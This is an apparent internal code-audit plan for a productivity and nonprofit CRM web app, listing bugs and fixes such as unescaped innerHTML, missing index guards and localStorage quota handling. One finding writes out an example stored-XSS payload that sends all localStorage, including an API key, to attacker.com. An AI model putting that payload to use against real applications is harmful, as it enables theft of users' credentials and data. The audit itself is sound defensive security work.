# Givelink Improvement Plan — Round 2

Audited: 2026-06-09 (post-fix pass) | Files: `index.html`, `givelink.html`

Previous round fixed: wrong model ID, NP modal stale buttons, empty catch blocks, `.slice(-1)[0]` null safety, `safeSet()` helper (partial), `AbortController` on all fetches, `response.ok` checks, `renderDash` split, hardcoded color pass, sprint past-date validation, `syncToTaskOS` / `generateOutreach` button states, `execCommand` clipboard fallback, SW error handler, nav `role="button"`.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### 1. `saveTask` writes to `S.tasks[-1]` when task is not found
**What:** `findIndex` returns `-1` when `editT` ID is not in `S.tasks`. The next line immediately does `S.tasks[-1] = {...}`, silently creating a junk entry at index `-1` instead of updating the task or showing an error.  
**Where:** `index.html:3117`  
**Why it matters:** Editing a task that was deleted or synced away corrupts the task array without any user feedback. The stale entry persists until the next hard reload.  
**Effort:** S  
**Suggested fix:**
- Change to: `if(editT){ const i=S.tasks.findIndex(t=>t.id===editT); if(i>=0) S.tasks[i]={...S.tasks[i],...d}; else { toast('Task no longer exists — it may have been deleted'); return; } }`
- Same guard needed for `saveGoal` at `index.html:3360`

---

### 2. `saveGoal` writes to `S.goals[-1]` on missing goal
**What:** Identical pattern to #1 — `S.goals[findIndex()]` without an `i >= 0` check.  
**Where:** `index.html:3360`  
**Why it matters:** Same corruption risk as saveTask. Opening a goal edit modal, then deleting the goal from a different tab/device before saving, silently corrupts the goals array.  
**Effort:** S  
**Suggested fix:**
- `if(i>=0) S.goals[i]={...S.goals[i],...d}; else { toast('Goal no longer exists'); return; }`

---

### 3. Task titles render unescaped into innerHTML in the Weekly Review wizard
**What:** Steps 0 and 2 of `renderWizPanel` template-literal task titles directly into `body.innerHTML` without `esc()`. A task named `<img src=x onerror="fetch('//attacker.com/?k='+JSON.stringify(localStorage))">` would exfiltrate all localStorage (including the Claude API key) when the user opens the Weekly Review.  
**Where:** `index.html:2890` (step 0 — completed tasks), `index.html:2897` (step 2 — backlog promotion)  
**Why it matters:** This is a stored XSS vector in a user-visible feature. Any task title with HTML tags silently executes in the user's browser.  
**Effort:** S  
**Suggested fix:**
- Line 2890: Change `${t.title}` → `${esc(t.title)}`
- Line 2897: Change `${t.title}` → `${esc(t.title)}` (two occurrences in that line)
- Also audit `index.html:2899` (goal titles in step 3) — same fix needed: `${esc(g.title)}`

---

### 4. Goal titles and core values render unescaped into innerHTML
**What:** Two more unescaped user-data-to-innerHTML paths: (a) `renderWizPanel` step 3 renders goal titles without `esc()`, (b) `renderGoals` renders `S.values` entries with `💎 ${v}` — no `esc()`.  
**Where:** `index.html:2899` (goal titles in wizard), `index.html:2827` (core values on Goals page)  
**Why it matters:** Saving a value like `<script>...</script>` in Settings corrupts the Goals page on every load. Goal titles with `<` or `"` break the wizard HTML.  
**Effort:** S  
**Suggested fix:**
- Line 2899: `${g.title}` → `${esc(g.title)}`
- Line 2827: `💎 ${v}` → `💎 ${esc(v)}`

---

### 5. `renderVelocityStats` renders `NaN` when a sprint has zero tasks
**What:** `pctDone = Math.round(v.done / v.total * 100)` — when `v.total === 0` this produces `NaN`. The stat block renders "NaN%" on the Overview page. Every new user's first sprint shows this.  
**Where:** `givelink.html:1563`  
**Why it matters:** This is literally the first thing a new user sees after creating a sprint. "NaN%" looks broken and erodes trust immediately.  
**Effort:** S  
**Suggested fix:**
- `const pctDone = v.total > 0 ? Math.round(v.done / v.total * 100) : 0`
- Also guard `goalEtaChip` at line 1574: `if(!v.daysElapsed || v.daysElapsed === 0) return ''` before dividing

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### 6. Both `toast()` functions use `innerHTML`, making them XSS vectors
**What:** `index.html:2274` — `el.innerHTML = msg`. `givelink.html:452` — `t.innerHTML = msg`. Any call site that passes user-derived data to toast (e.g., `toast('AI error: ' + e.message)`, where `e.message` could come from a malicious API response) executes arbitrary HTML.  
**Where:** `index.html:2274`, `givelink.html:452`  
**Why it matters:** Toast is called 100+ times across both files. Most calls are safe (string literals), but any future `toast(userInput)` call opens XSS — a maintenance trap.  
**Effort:** S  
**Suggested fix:**
- In both files, change `el.innerHTML = msg` → `el.textContent = msg`
- If emoji/bold formatting in toasts is needed, use a safe allowlist or construct the DOM manually

---

### 7. Command palette `it.sub` rendered unescaped into innerHTML
**What:** The command palette (⌘K) renders search results with `${it.sub}` directly in innerHTML. `it.sub` is populated from task categories, goal names, and other user data.  
**Where:** `index.html:3448`  
**Why it matters:** A goal named with HTML will execute when the user opens the command palette — a frequently used feature.  
**Effort:** S  
**Suggested fix:**
- Change `${it.sub}` → `${esc(it.sub||'')}`

---

### 8. Readwise book title inserted unescaped into loading spinner HTML
**What:** `body.innerHTML = \`... Loading highlights for "${title}"...\`` — `title` comes from the Readwise API response, which is external data the user cannot control but that could theoretically contain HTML if a book title has special characters (e.g., `O'Reilly <Media>`).  
**Where:** `index.html:8867`  
**Why it matters:** This follows an anti-pattern: third-party API data → innerHTML without escaping. Even if Readwise is trusted today, the pattern sets a bad precedent.  
**Effort:** S  
**Suggested fix:**
- Change `"${title}"` → `"${esc(title)}"` 

---

### 9. `saveSettings` has 6 raw `localStorage.setItem` calls bypassing `safeSet()`
**What:** Profile name, about text, Readwise key, Notion key/page, and Supabase settings are all written with raw `localStorage.setItem` in `saveSettings`, not the `safeSet()` helper added in the previous pass. These writes fail silently on storage-full.  
**Where:** `index.html:8511, 8518, 8520, 8522, 8524, 8526–8528`  
**Why it matters:** A user who hits storage limits while saving their Claude API key or Readwise token silently loses the setting — they notice only when AI features stop working.  
**Effort:** S  
**Suggested fix:**
- Replace all 6 raw calls in `saveSettings` with `safeSet(key, value)` / `safeSet` + `localStorage.removeItem` pattern

---

### 10. 12 additional raw `localStorage.setItem` calls still bypass `safeSet()`
**What:** Outside `saveSettings`, a further 12 direct `setItem` calls remain unguarded: wizard draft (`2955`), review history (`2977`), eat-the-frog flag (`5013`), pre-mortem flag (`5672`), dynamic feature flags (`6814`), someday audit date (`7157`), onboarding flags (`8074, 8078`), PWA prompts (`8742, 8762`), checklist state (`9193`), readwise cache (`9702`).  
**Where:** `index.html:2977, 5013, 5672, 6814, 7157, 8074, 8078, 8742, 8762, 9193, 9702`  
**Why it matters:** Any of these can throw `QuotaExceededError` uncaught, crashing the JS execution mid-flow and leaving the app in a broken state with no user message.  
**Effort:** S  
**Suggested fix:**
- Global replace: `localStorage.setItem(` → `safeSet(` for all remaining occurrences outside the `safeSet` definition and the `save()` function
- Also handle `localStorage.setItem` inline in the install-banner onclick at `index.html:12016`

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### 11. `givelink.html` `save()` uses raw `localStorage.setItem` — no quota protection
**What:** `givelink.html`'s `save()` function calls `localStorage.setItem` without a try/catch or `safeSet`. The `safeSet` helper only exists in `index.html`.  
**Where:** `givelink.html` — the `save()` function (search for `localStorage.setItem('taskos'`)  
**Why it matters:** Storage full in givelink silently drops all CRM and sprint data. Unlike index.html (which has a QuotaExceededError toast in `save()`), givelink has no protection.  
**Effort:** S  
**Suggested fix:**
- Add the same try/catch pattern from `index.html:2099` to givelink's `save()`, or copy the `safeSet` helper into `givelink.html` and use it

---

### 12. Hardcoded hex colors in velocity/goal/CRM widgets in `givelink.html`
**What:** `renderVelocityStats` and `goalEtaChip` hardcode `#22c55e`, `#ef4444`, `#fbbf24` — the same color palette that's already partially in CSS variables (`--done`, `--block`). `_sbRenderStatus` in `index.html` hardcodes `#ef4444` and `#69db7c`.  
**Where:** `givelink.html:1564, 1567, 1576–1578`; `index.html:8555`  
**Why it matters:** Light-mode and theming changes require hunting down hardcoded colors across both files instead of updating one CSS variable.  
**Effort:** S  
**Suggested fix:**
- `givelink.html`: Replace `#22c55e` → `var(--done,#22c55e)`, `#ef4444` → `var(--block,#ef4444)`, `#fbbf24` → `var(--warn,#fbbf24)`
- Define `--done`, `--block`, `--warn` in the `:root` CSS block if not already present
- `index.html:8555`: `'#ef4444'` → `'var(--q1,#ef4444)'`, `'#69db7c'` → `'var(--q2,#69db7c)'`

---

### 13. `renderWizPanel` is ~160 lines of concatenated inline HTML
**What:** The entire weekly review wizard body — 6 steps, dozens of template literals, and all interaction logic — is a single `renderWizPanel()` function. Adding a new step or fixing a bug in one step risks breaking every other step.  
**Where:** `index.html:2885–3060` (approx.)  
**Why it matters:** The wizard is a high-value feature (weekly review drives retention) that's hard to maintain. The last bug fix pass touched this function and introduced a regression.  
**Effort:** M  
**Suggested fix:**
- Extract each step into `_wizStep0()` through `_wizStep5()`, each returning an HTML string
- `renderWizPanel()` becomes: `body.innerHTML = [_wizStep0, ..., _wizStep5][wizStep]() + _wizNav()`
- Reduces blast radius of each step's changes to its own function

---

### 14. `_wizSave()` uses raw `localStorage.setItem` inconsistently
**What:** `_wizSave` is wrapped in try/catch (good) but calls raw `localStorage.setItem` instead of `safeSet`. On quota error, `catch(e)` logs to console but the user gets no feedback that their review draft wasn't saved.  
**Where:** `index.html:2955`  
**Why it matters:** Users who spend 10+ minutes on a weekly review and hit storage limits silently lose their draft — they notice only when they return and find an empty form.  
**Effort:** S  
**Suggested fix:**
- Change `localStorage.setItem('taskos_wiz_draft', ...)` → `safeSet('taskos_wiz_draft', ...)`
- The existing try/catch can remain for the JSON.stringify part

---

### 15. `applyTheme` changes the brand-color PWA theme-color to `#f5f5f0` in light mode
**What:** `applyTheme(true)` sets the `<meta name="theme-color">` to `#f5f5f0` (off-white), washing out the brand purple in the PWA chrome when light mode is active.  
**Where:** `index.html:2069` (the light-mode value)  
**Why it matters:** Light-mode users see a white/grey PWA header instead of the brand purple. On Android, the task-switcher thumbnail loses brand identity.  
**Effort:** S  
**Suggested fix:**
- Change `light?'#f5f5f0':'#6B3FA0'` → `light?'#EDE7F6':'#6B3FA0'` (light purple instead of off-white, still readable in light mode)

---

## 💡 P3 — Nice to have

---

### 16. `estimatedPeople` accepts negative numbers
**What:** The nonprofit CRM "Est. People Served" field has `min="0"` as an HTML attribute but `parseInt()` in `saveNP` doesn't validate — negative values pass through to `S.nonprofits`.  
**Where:** `givelink.html:1430`  
**Why it matters:** Low severity; negative people counts distort the "people impacted" metric on the dashboard.  
**Effort:** S  
**Suggested fix:**
- Add: `if(estimatedPeople < 0){ toast('People served must be 0 or greater'); return; }` before saving

---

### 17. No `maxlength` on free-text form inputs
**What:** Title, notes, mission, and name fields in both files have no `maxlength`. Very long pastes can break card layouts and bloat localStorage beyond quota.  
**Where:** `givelink.html:318–361` (add task form), `index.html` task modal inputs  
**Why it matters:** A pasted 10,000-character note into a task title will overflow the task card UI and can accelerate storage quota exhaustion.  
**Effort:** S  
**Suggested fix:**
- Add `maxlength="200"` to title fields, `maxlength="2000"` to notes/mission fields

---

### 18. Hardcoded personal fallback in AI prompts ignores `getAboutMe()`
**What:** Several AI prompts in `index.html` fall back to `"Panos — 20s founder building Givelink (B2B SaaS for nonprofits), targeting financial freedom and an SF move."` as a hardcoded string. `getAboutMe()` exists and returns user-configured data, but the fallback leaks a specific person's details into shared code.  
**Where:** `index.html:~11550, ~11559, ~11620, ~11630`  
**Why it matters:** If another user installs Task OS, all their AI coaching prompts include Panos's personal context instead of theirs. Low impact today (single user) but a future-proofing issue.  
**Effort:** S  
**Suggested fix:**
- Replace hardcoded fallbacks with: `getAboutMe() || 'A founder working on a SaaS startup.'`

---

### 19. Inline `localStorage.setItem` inside an HTML `onclick` attribute
**What:** The PWA install banner close button calls `localStorage.setItem('pwa_install_dismissed','1')` directly in an inline `onclick` attribute — bypassing `safeSet`, no error handling, and mixing logic into markup.  
**Where:** `index.html:12016`  
**Why it matters:** Minor, but it's the only remaining raw setItem in an HTML attribute. On storage full, the banner reappears on every reload.  
**Effort:** S  
**Suggested fix:**
- Extract to a named function: `function _dismissInstallBanner(){ safeSet('pwa_install_dismissed','1'); document.getElementById('install-banner').style.display='none'; }`
- Update the onclick: `onclick="_dismissInstallBanner()"`

---

### 20. `givelink.html` `toast()` renders emoji labels with `innerHTML` — no safe fallback if msg is dynamic
**What:** `toast()` in givelink.html sets `t.innerHTML = msg`. All current callers pass literal strings, but future callers passing user data (error messages from API, org names, etc.) will be vulnerable. Already partially fixed in index.html (which should use `textContent` too).  
**Where:** `givelink.html:452`  
**Why it matters:** Defense-in-depth: when the inevitable `toast(np.name + ' added!')` call happens in a refactor, the HTML injection risk is already baked in.  
**Effort:** S  
**Suggested fix:**
- Change `t.innerHTML = msg` → `t.textContent = msg` in givelink's toast function
- If emoji in toasts is needed, set them separately as a `data-icon` or prepend a `<span>` element
